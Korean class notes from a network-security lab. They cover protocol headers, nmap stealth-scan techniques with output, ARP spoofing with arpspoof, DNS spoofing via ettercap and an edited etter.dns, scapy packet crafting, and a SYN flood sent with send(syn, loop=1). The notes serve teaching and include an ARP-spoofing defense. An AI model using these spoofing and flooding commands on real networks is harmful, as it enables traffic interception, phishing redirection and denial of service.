# 190605(Wed)_Network Secure

계층                                           주요정보        데이터 전송 단위          주요 프로토콜

======================= =========  ================= ===========

응용 = 프로세스		                 : 메시지                                               약 65000개

전송				                            + 포트번호     데이터그램/세그먼트    UDP, TCP

네트워크 = 인터넷		             + IP주소         패킷                               IP, ICMP, ...

데이터링크 --+			               + MAC주소    프레임                            Ethernet, PPP, … 

물리 -----------+      = 네트워크 인터페이스/접근



### UDP 헤더

![img](https://lh5.googleusercontent.com/q-EwERKG102SqEYtQt6kVM5WmMnTCXYe9nMLnYY_fgxuV_aiuIZk9BCgdkchE_wNukQT8MMA-r-S9jMZyl12UP4vhaMB0rwPr2YPYmuTwONz-Ii2KURyu95wW5ucmJeTDTSpZhKG)



### TCP 헤더

![img](https://lh4.googleusercontent.com/6U6fVBGYn8EQrMDylkdKEapcrR73-h8gLEUYC-zScgjhGV4kHhK7rkmN60RF0Bnp5HTK8HI5m3ZKdGUaLF7OVj5vXAUf9HONiziIGTQiq23hK9V-3ZHfKJ8ZFSbOPeu6-0sSyeH4)

### IP 헤더

![img](https://lh5.googleusercontent.com/BsKAZSA5sdgJOtzor8ZDDehMsfUy3PkwlVS1ll7pyyBMmJLJykhxz3N8NAHVC93pMhGcJd8UbqLBrXlljqsVb3E0jvHaYJXErjDVNcQ7GScfcNLV5_1LFcUvmBbR4cP7dwVQvROO)



### 티얼드롭(tear drop) 공격

- IP 헤더의 프래그먼트 오프셋을 조작하여 수신측에서 분할된 패킷을 재조립할 수 없도록 하는 공격 기법



## **포트 스캐닝**

### **TCP Open Scan**

- TCP 연결과정(3-way handshaking)을 통해서 해당 포트의 실행(사용) 여부를 확인

- 해당 포트가 유효하면 

  - SYN → SYN/ACK → ACK 

    ⇒ 연결(세션)이 수립 → 접속(연결) 로그가 남음

- 해당 포트가 무효하면 
  - SYN → RST/ACK 

```
root@kali:~# nmap -sT 192.168.111.130 -p 80 

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2019-06-04 22:26 EDT
Nmap scan report for 192.168.111.130
Host is up (0.00039s latency).
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:50:56:24:73:F1 (VMware) 

Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds 
```



```
root@kali:~# nmap -sT 192.168.111.130 -p 8080

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2019-06-04 22:26 EDT
Nmap scan report for 192.168.111.130
Host is up (0.00035s latency).
PORT     STATE  SERVICE
8080/tcp closed http-proxy
MAC Address: 00:50:56:24:73:F1 (VMware) 

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
```

![img](https://lh5.googleusercontent.com/2vJvz20BDtCbIq1kmfi6zxIQCMilMXR9fMD1H5x9VKOFPnTQleJzXF5DTNdV4nsgwgrdpU0LfRAbLZqPX1MlM5FsBRIZVR0vQvIcKJz2PfcxYx7z4CQbdzFnWY-acQFSg_PyDCJg)



## Stealth Scan

- 기록을 남기지 않는 포트 스캔 방법

### **TCP half open scan = TCP SYN open scan**

- 해당 포트가 유효하면 

  - SYN → SYNC/ACK → (RST) 

    ⇒ 연결이 수립되지 않음 → 로그가 남지 않음 

- 해당 포트가 무효하면 
  - SYN → RST/ACK

```
root@kali:~# nmap -sS 192.168.111.130 -p 80 

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2019-06-04 22:31 EDT
Nmap scan report for 192.168.111.130
Host is up (0.00045s latency).
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:50:56:24:73:F1 (VMware) 

Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds 

root@kali:~# nmap -sS 192.168.111.130 -p 8080
Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2019-06-04 22:32 EDT
Nmap scan report for 192.168.111.130
Host is up (0.00032s latency).
PORT     STATE  SERVICE
8080/tcp closed http-proxy
MAC Address: 00:50:56:24:73:F1 (VMware) 

Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
```

![img](https://lh4.googleusercontent.com/81xYOZxVIGy-5u9cW5MQBBUrGYWBeFO0UNl5TNjtm9wfZFUUAVAjcPMQSmVxNHZMeQNndLapicuYKDKzr-9i0s2NLmuLKqF1fxGOvGIDSsRhbtf5Lf03JzWgZUOZdPkjcqDRDT1J)



### **FIN scan** 

- 해당 포트가 유효하면 
  - FIN → ??? (무응답)

- 해당 포트가 무효하면 
  - FIN → RST/ACK

```
root@kali:~# nmap -sF 192.168.111.130 -p 80 

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2019-06-04 22:36 EDT
Nmap scan report for 192.168.111.130
Host is up (0.00049s latency).
PORT   STATE         SERVICE
80/tcp open|filtered http
MAC Address: 00:50:56:24:73:F1 (VMware) 

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds 

root@kali:~# nmap -sF 192.168.111.130 -p 8080 

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2019-06-04 22:36 EDT
Nmap scan report for 192.168.111.130
Host is up (0.00035s latency).
PORT     STATE  SERVICE
8080/tcp closed http-proxy
MAC Address: 00:50:56:24:73:F1 (VMware) 

Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
```

![img](https://lh5.googleusercontent.com/X1o5PO17LA4Xjj1H2E5ym4JOnCGxq15oOuIUQ9MWKbwV9tKjPZKQuv-dy19-7vHHtUgzQUVGprQqm8AvfIg0ui1RFexZZHYAYl7_Gk2jDM_lmlB_3JJRy5gL1kdgr0AtviohAdpd)



### XMAS scan

- 해당 포트가 유효하면 
  - FIN+PSH+URG → ??? (무응답)

- 해당 포트가 무효하면 
  - FIN+PSH+URG → RST/ACK

```
root@kali:~# nmap -sX 192.168.111.130 -p 80 

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2019-06-04 22:35 EDT
Nmap scan report for 192.168.111.130
Host is up (0.00036s latency).
PORT   STATE         SERVICE
80/tcp open|filtered http
MAC Address: 00:50:56:24:73:F1 (VMware) 

Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds 

root@kali:~# nmap -sX 192.168.111.130 -p 8080 

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2019-06-04 22:35 EDT
Nmap scan report for 192.168.111.130
Host is up (0.00032s latency).
PORT     STATE  SERVICE
8080/tcp closed http-proxy
MAC Address: 00:50:56:24:73:F1 (VMware) 

Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
```

![img](https://lh6.googleusercontent.com/qSeoepk4JC_SpDnU6oCeBGgJzB-3e1bp_zyEegq0TH2nchRyj0dYwWSN7UFlyaeqKB-3LtrISNVEfPCP36kjJsYEHCmFNRemfBFnic7yoQ8hTtszHBEIPgV0ltZ9njJCjptOL8E6)



### NULL scan

- 해당 포트가 유효하면 
  - NULL → ??? (무응답)

- 해당 포트가 무효하면 
  - NULL → RST/ACK

```
root@kali:~# nmap -sN 192.168.111.130 -p 80 

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2019-06-04 22:33 EDT
Nmap scan report for 192.168.111.130
Host is up (0.00044s latency).
PORT   STATE         SERVICE
80/tcp open|filtered http
MAC Address: 00:50:56:24:73:F1 (VMware) 

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds 

root@kali:~# nmap -sN 192.168.111.130 -p 8080 

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2019-06-04 22:33 EDT
Nmap scan report for 192.168.111.130
Host is up (0.00031s latency).
PORT     STATE  SERVICE
8080/tcp closed http-proxy
MAC Address: 00:50:56:24:73:F1 (VMware) 

Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
```

![img](https://lh5.googleusercontent.com/squZ8HzUeskoyxt62F66Kla9LXZZgJT6C9yECcsRknSOlCQr9Y_-qJjS32eLWMKRkHM0Sw5OlC8AEqkyv7eAz6797usBq_pRXg27P40BvH4uzukmmAIaXtfjtmFva2g7GlWj0-Bp)



### **nmap (network map)**

- 네트워크에 연결되어 있는 호스트의 정보를 파악하는 도구
- nmap을 이용해서 네트워크에 연결되어 있는 호스트의 IP, OS, Service Port, SW 등을 확인할 수 있음

```
nmap --help
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags <flags>: Customize TCP scan flags
  -sI <zombie host[:probeport]>: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b <FTP relay host>: FTP bounce scan
```



### @Kali#1에 apache2, vsftp 서비스를 실행

```
# service apache2 start
# service vsftpd start
```

- @Kali#2에서 Kali#1으로 웹 서비스 요청과 FTP 서비스 요청을 할 수 있음



### **ARP(Address Resolution Protocol)**

![img](https://lh4.googleusercontent.com/gNorySXCV9KgeFxblTtrOYHVOS_9W0XH-zhw5ZB8r2x9VwUtpIYwPqeA9mUmE25ORCc3EJG5qSU5cBpzVF5TQtIlC1rcUO27Q86_VkXyXk4t5onAeaiW9MHVENyvXa4MkaR8Y9fP)

![img](https://lh5.googleusercontent.com/zgtM7Y-8YhqXNC95jZTko0n2ewsPEAdfvP44-E3wdrTwUidm6Mc15Zdi3kSbXQ2u5xilpcrffwibDs36jOZ5ds_5ME4C6LXTVSh4eRYaYSJOKMW9O7bghYP1IQ9CUUCCU4KvQh2b)

- windows xp : administrator / 0sook (숫자0 영문자sook)

​        IP Address. . . . . . . . . . . . : 192.168.111.140

​        Subnet Mask . . . . . . . . . . . : 255.255.255.0

​        Default Gateway . . . . . . . . . : 192.168.111.2

- Kali#1 : 192.168.111.130

- Kali#2 : 192.168.111.131



### ARP Spoofing

##### [@Kali2 ]

```
# arpspoof -i eth0 -t VICTIM_IP(WINXP) GATEWAY_IP

⇒ # arpspoof -i eth0 -t 192.168.111.140 192.168.111.2
```

```
C:\Documents and Settings\Administrator>arp -a

Interface: 192.168.111.140 --- 0x2

  Internet Address      Physical Address      Type

  192.168.111.2         00-50-56-fd-f9-c0     dynamic
```

```
C:\Documents and Settings\Administrator>arp -a

Interface: 192.168.111.140 --- 0x2

  Internet Address      Physical Address      Type

  192.168.111.2         00-50-56-34-96-a1     dynamic

  192.168.111.131       00-50-56-34-96-a1     dynamic
```

### ARP Spoofing 방어

- ARP cache talble에 Gateway MAC 주소를 정적으로 설정

##### windows

```
>arp -s GATEWAY_IP GATEWAY_MAC
>netst interface ip delete neighbors "NETWORK_CARD_NAME" "GATEWAY_IP"
>netst interface ip add neighbors "NETWORK_CARD_NAME" "GATEWAY_IP" "GATEWAY_MAC"
```

### MTM(Man in The Middle) Attack

- 두 호스트 간의 통신을 하고 있을 때, 중간자가 끼어들어 통신 내용을 도청 또는 조작

##### DNS Spoofing

- etter.dns 파일 수정

  ```
  #gedit /etc/ettercap/etter.dns
  
  *.naver.*	A	<공격자의 IP>    추가
  ```

- ettercap 실행

  ```
  #ettercap -G
  ```

- unified sniffing > NIC 지정

  \> Scan for hosts (해당 LAN에 존재하는 호스트를 검색)

  \> Hosts list (검색 결과를 확인)

- 공격 대상을 지정

  - target1 ⇒ Gateway (192.168.111.2)

  - target2  ⇒ WinXP (192.168.111.133)

- Arp spoofing (공격자를 공격 대상 사이에 위치시킴)

  - Mitm > ARP poisoning> Sniff remote connections

- DNS spoofing 공격

  - Plugins > Manage the plugins > dnsspoof



ettercap  실행

![img](https://lh4.googleusercontent.com/Kbz5er2d1TU0C5AyPayS9hNUwKMb5mYIQMt17STGAyKN0wTsU3_ns9kqxJeZDsTbYli63Czl_NSIvvqUmj5NOfVj7-TU8aMVMfXEs0ou3_c5xVsIvEjQyWPINFptuVNXrGkxJdan)



### scapy

- 파이썬으로 작성된 패킷 조작 도구

- 패킷 디코딩, 전송 ,캡처, 수정 등 다양한 기능을 제공

- https://www.itlkorea.kr/data/scapy-pocket-guide0.2.pdf

  ```
  #scapy
  >>ls() : 지원하는 프로토콜을 확인
  >>ls(TCP) : TCP 헤더 정보를 출력
  >>TCP().display() : 현재 설정되어 있는 TCP 정보를 출력
  >>lsc() : 사용가능한 기능을 확인
  ```

- 변수 할당

  ```
  >>ip = IP()
  >>ip.display() : 변수 활용
  ```

- 현재 IP 헤더의 목적지 주소를 변경

  ```
  >>ip.dst="192.168.111.130" or ip=IP(dst="192.168.111.130")
  >>ip.display()
  ```

##### 레이어를 쌓는 방법

```
>>ip = IP()
>>tcp = TCP()
>>packet = ip/tcp
>>packet.display()
```

##### sniff()

```
>>sf = sniff()
ctrl+c
>>sf.display()
```

```
>>sf = sniff(count=10)
```

```
>>sf[0].show()
```

### Scapy를 이용한 3-way handshake

```
>>tcp = TCP()
>>tcp.sport = RandNum(1024, 65535)
>>ip = IP()
>>ip.dst="<상대방IP>"
>>syn = ip/tcp
>>syn_ack = sr1(syn)
>>ack = ip/TCP(sport=syn_ack[TCP].dport, dport=syn_ack[TCP].sport, flags="A", seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq+1)
```

- sr1 : 보내고 응답을 기다리는 함수

- seq : 상대가 관리하는 번호
- ack : 내가 관리하는 번호(상대가 seq로 줬으면 하는)



### TCP SYN Flooding

- SYN 패킷을 계속해서 전달

##### @kali#1의 syncookies를 사용하지 않게 함

```
@kali#1
#sysctl -a | grep syncookies
net.ipv4.tcp_syncookies = 1 : syncookies를 사용 = backlog queue에 SYN 패킷을 저장하지 않음
```

##### @kali#2에서 RST 패킷이 외부로 나가지 못하도록 방화벽에 등록

```
@kali#2
#iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
```

- 방화벽 정책 삭제

  ```
  #iptables -L -n
  #iptables -D OUTPUT <number>
  ```

##### @kali#2에서 syn 무한 전송

```
>>send(syn, loop=1)
```

